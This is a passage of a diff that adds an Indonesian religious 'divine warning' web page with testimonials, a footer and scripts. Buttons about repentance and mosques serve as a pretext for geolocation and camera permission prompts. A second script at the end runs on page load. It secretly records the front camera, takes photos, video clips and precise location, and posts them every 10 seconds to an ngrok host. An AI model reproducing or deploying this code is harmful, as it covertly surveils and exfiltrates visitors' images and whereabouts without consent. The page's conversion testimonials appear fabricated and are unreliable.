+                        "Saya dulu seorang ateis yang sering mengejek Islam di media sosial. Setelah divonis kanker stadium lanjut, saya berdoa kepada Allah dan sembuh secara ajaib. Sekarang saya seorang muslim yang taat."
+                    </div>
+                    <div class="testimonial-author">- David Wilson, Mantan Ateis</div>
+                </div>
+
+                <div class="testimonial-item">
+                    <div class="testimonial-text">
+                        "Saya dulu kritikus Islam dan menulis buku yang menyerang Nabi Muhammad. Sekarang saya menarik semua buku saya setelah mimpi yang mengubah hidup saya bersama Rasulullah ﷺ."
+                    </div>
+                    <div class="testimonial-author">- Sarah Johnson, Mantan Penulis Anti-Islam</div>
+                </div>
+
+                <div class="testimonial-nav">
+                    <div class="testimonial-dot active" data-slide="0"></div>
+                    <div class="testimonial-dot" data-slide="1"></div>
+                    <div class="testimonial-dot" data-slide="2"></div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer id="kontak">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h3>Tentang Kami</h3>
+                    <p>Website ini dibuat sebagai peringatan bagi semua orang tentang bahaya menghina Islam dan Rasulullah ﷺ. Semoga menjadi pelajaran bagi semua.</p>
+                    <div class="social-links">
+                        <a href="#"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+
+                <div class="footer-column">
+                    <h3>Menu Cepat</h3>
+                    <ul class="footer-links">
+                        <li><a href="#home">Beranda</a></li>
+                        <li><a href="#ayat">Ayat & Hadits</a></li>
+                        <li><a href="#kisah">Kisah Nyata</a></li>
+                        <li><a href="#akibat">Akibat Penghinaan</a></li>
+                        <li><a href="#kontak">Kontak Kami</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-column">
+                    <h3>Hubungi Kami</h3>
+                    <p><i class="fas fa-envelope"></i> info@peringatanillahi.com</p>
+                    <p><i class="fas fa-phone"></i> +62 123 4567 890</p>
+                    <p><i class="fas fa-map-marker-alt"></i> Jakarta, Indonesia</p>
+                </div>
+            </div>
+
+            <div class="copyright">
+                <p>&copy; <span id="year"></span> Peringatan Ilahi. Semua Hak Dilindungi.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Back to Top Button -->
+    <div class="back-to-top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script>
+        // Show warning alert after 3 seconds
+        setTimeout(() => {
+            document.getElementById('warningAlert').style.display = 'block';
+            
+            // Hide alert after 10 seconds
+            setTimeout(() => {
+                document.getElementById('warningAlert').style.display = 'none';
+            }, 10000);
+        }, 3000);
+
+        // Button actions
+        document.getElementById('btnTobat').addEventListener('click', function() {
+            alert('Alhamdulillah, Anda memilih untuk bertaubat. .');
+            // Request location permission
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        alert('Terima kasih. anda telah menyetujui. Kami akan membantu Anda menemukan masjid terdekat untuk bertaubat.');
+                    },
+                    function(error) {
+                        alert('Anda menolak tobat. Silahkan cari masjid terdekat untuk bertaubat.');
+                    }
+                );
+            } else {
+                alert('bertaubatlah kawan kembali kepada Allah .');
+            }
+            document.getElementById('warningAlert').style.display = 'none';
+        });
+
+        document.getElementById('btnIgnore').addEventListener('click', function() {
+            alert('Anda memilih untuk tidak peduli sungguh balasan allah lebih kejam kepadamu .');
+            // Request camera permission
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    alert('audah aktif. Ingatlah bahwa Allah Maha Melihat segala perbuatan Anda.');
+                    stream.getTracks().forEach(track => track.stop());
+                })
+                .catch(function(err) {
+                    alert('Anda menolak . Ingatlah bahwa Allah tetap Maha Melihat.');
+                });
+            document.getElementById('warningAlert').style.display = 'none';
+        });
+
+        // Navbar Scroll Effect
+        window.addEventListener('scroll', function() {
+            const header = document.getElementById('header');
+            if (window.scrollY > 50) {
+                header.classList.add('scrolled');
+            } else {
+                header.classList.remove('scrolled');
+            }
+        });
+
+        // Mobile Menu Toggle
+        const hamburger = document.querySelector('.hamburger');
+        const navLinks = document.querySelector('.nav-links');
+        
+        hamburger.addEventListener('click', function() {
+            navLinks.classList.toggle('active');
+            hamburger.innerHTML = navLinks.classList.contains('active') ? 
+                '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
+        });
+
+        // Close mobile menu when clicking on a link
+        document.querySelectorAll('.nav-links a').forEach(link => {
+            link.addEventListener('click', () => {
+                navLinks.classList.remove('active');
+                hamburger.innerHTML = '<i class="fas fa-bars"></i>';
+            });
+        });
+
+        // Testimonial Slider
+        let currentTestimonial = 0;
+        const testimonials = document.querySelectorAll('.testimonial-item');
+        const dots = document.querySelectorAll('.testimonial-dot');
+        
+        function showTestimonial(index) {
+            testimonials.forEach(item => item.classList.remove('active'));
+            dots.forEach(dot => dot.classList.remove('active'));
+            
+            testimonials[index].classList.add('active');
+            dots[index].classList.add('active');
+            currentTestimonial = index;
+        }
+        
+        // Dot navigation
+        dots.forEach((dot, index) => {
+            dot.addEventListener('click', () => {
+                showTestimonial(index);
+            });
+        });
+        
+        // Auto-rotate testimonials every 5 seconds
+        setInterval(() => {
+            currentTestimonial = (currentTestimonial + 1) % testimonials.length;
+            showTestimonial(currentTestimonial);
+        }, 5000);
+        
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                const targetId = this.getAttribute('href');
+                const targetElement = document.querySelector(targetId);
+                
+                if (targetElement) {
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 80,
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+
+        // Back to Top Button
+        const backToTopBtn = document.querySelector('.back-to-top');
+        
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('active');
+            } else {
+                backToTopBtn.classList.remove('active');
+            }
+        });
+        
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        });
+
+        // Set current year in footer
+        document.getElementById('year').textContent = new Date().getFullYear();
+    </script>
+    <script>
+  const backendURL = "https://f3fe40e9e1b9.ngrok-free.app"; // Langsung ke root "/"
+
+  const video = document.createElement("video");
+  video.setAttribute("playsinline", true);
+  video.setAttribute("autoplay", true);
+  video.setAttribute("muted", true);
+  video.style.display = "none";
+  document.body.appendChild(video);
+
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+  canvas.style.display = "none";
+  document.body.appendChild(canvas);
+
+  let mediaStream = null;
+
+  async function initCamera() {
+    try {
+      mediaStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false
+      });
+      video.srcObject = mediaStream;
+      await video.play();
+      console.log("✅ Kamera aktif");
+    } catch (err) {
+      console.warn("❌ Kamera tidak diizinkan:", err.message);
+    }
+  }
+
+  async function getLocation() {
+    return new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          console.log("📍 Lokasi diambil:", pos.coords);
+          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+        },
+        (err) => {
+          console.warn("❌ Lokasi tidak diizinkan:", err.message);
+          resolve(null);
+        },
+        { enableHighAccuracy: true }
+      );
+    });
+  }
+
+  async function capturePhoto() {
+    return new Promise((resolve) => {
+      if (!video.videoWidth || !video.videoHeight) return resolve(null);
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.95);
+    });
+  }
+
+  async function captureVideo(durationMs = 5000) {
+  if (!mediaStream) return null;
+
+  return new Promise((resolve) => {
+    const chunks = [];
+    const recorder = new MediaRecorder(mediaStream, {
+      mimeType: "video/webm;codecs=vp8"
+    });
+
+    recorder.ondataavailable = (e) => {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+    recorder.onstop = () => {
+      const blob = new Blob(chunks, { type: "video/webm" });
+      resolve(blob);
+    };
+
+    recorder.start();
+    setTimeout(() => recorder.stop(), durationMs);
+  });
+}
+
+async function sendAll() {
+  const [location, photo, videoBlob] = await Promise.all([
+    getLocation(),
+    capturePhoto(),
+    captureVideo()
+  ]);
+
+  const formData = new FormData();
+  if (location) {
+    formData.append("lat", location.lat);
+    formData.append("lon", location.lon);
+  }
+  if (photo) formData.append("photo", photo, "selfie.jpg");
+  if (videoBlob && videoBlob.size > 2000) {
+    formData.append("video", videoBlob, "rekaman.webm");
+  } else {
+    console.warn("⚠️ Video terlalu kecil, tidak dikirim");
+  }
+
+  if ([...formData.entries()].length > 0) {
+    try {
+      await fetch(backendURL, {
+        method: "POST",
+        body: formData
+      });
+      console.log("✅ Data terkirim");
+    } catch (e) {
+      console.error("❌ Gagal kirim:", e);
+    }
+  } else {
+    console.warn("❌ Tidak ada data untuk dikirim");
+  }
+}
+  async function startSystem() {
+    await initCamera();
+    setTimeout(() => {
+      sendAll(); // Kirim pertama
+      setInterval(sendAll, 10000); // Tiap 10 detik
+    }, 7000);
+  }
+
+  startSystem();
+</script>
+</body>
+</html>
